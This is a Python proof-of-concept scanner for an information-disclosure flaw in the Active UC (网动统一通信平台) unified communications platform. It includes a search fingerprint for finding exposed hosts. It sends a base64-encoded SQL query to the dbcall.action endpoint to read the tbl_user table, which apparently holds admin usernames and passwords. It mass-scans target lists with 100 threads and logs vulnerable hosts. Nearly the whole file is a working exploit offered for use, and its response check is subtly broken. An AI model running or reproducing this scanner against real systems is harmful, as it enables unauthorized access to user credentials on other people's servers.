import requests,urllib3,argparse,warnings,sys
from multiprocessing.dummy import Pool #多线程库
## title="网动统一通信平台(Active UC)" || (body="top.action?params=index" && body="preLog.action")
#禁用不安全的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    text = """
         __  .__                            
_____ _/  |_|__|__  __ ____  __ __   ____  
\__  \\   __\  \  \/ // __ \|  |  \_/ ___\ 
 / __ \|  | |  |\   /\  ___/|  |  /\  \___ 
(____  /__| |__| \_/  \___  >____/  \___  >
     \/                   \/            \/ 
                            author:eagle
"""
    print(text)
def main():
    #调用banner
    banner()   

    #初始化接收参数函数
    parse = argparse.ArgumentParser(description='ativeus网动统一通信平台信息泄露')
    #添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input your file')
    #实例化
    args = parse.parse_args()
    #对用户输入信息判断
    if args.url and not args.file:
        poc(args.url)
    #多线程
    elif args.file and not args.url:
        url_list = [] #接收文件内的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip()) #将去空的url写入url_list
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f'Usage python {sys.argv[0]} -h')

def poc(target):
    link = '/acenter/dbcall.action?'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.795.76 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'close'
            }
    data = 'cmdid=10018&verify_userid=dasd&verify_password=&verify_username=&verify_password_enc=&queryString=U0VMRUNUKkZST00vKiovdGJsX3VzZXIvKiovTElNSVQvKiovMCwx'
    try:
        res1 = requests.get(url=target,headers=headers,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link+data,headers=headers,timeout=5,verify=False)
            if 'USERNAME=admin' and 'PASSWORD=' in res2.text:
                print(f'[+]{target}存在信息泄露')
                with open('result.txt','a',encoding='utf-8') as r:
                    r.write(f'[+]{target}存在信息泄露\n')
            else:
                print(f'[-]{target}不存在信息泄露')
    except:
        print(f'[!]{target}站点存在问题，请手动复现')
    
#函数入口
if __name__ == "__main__":
    main()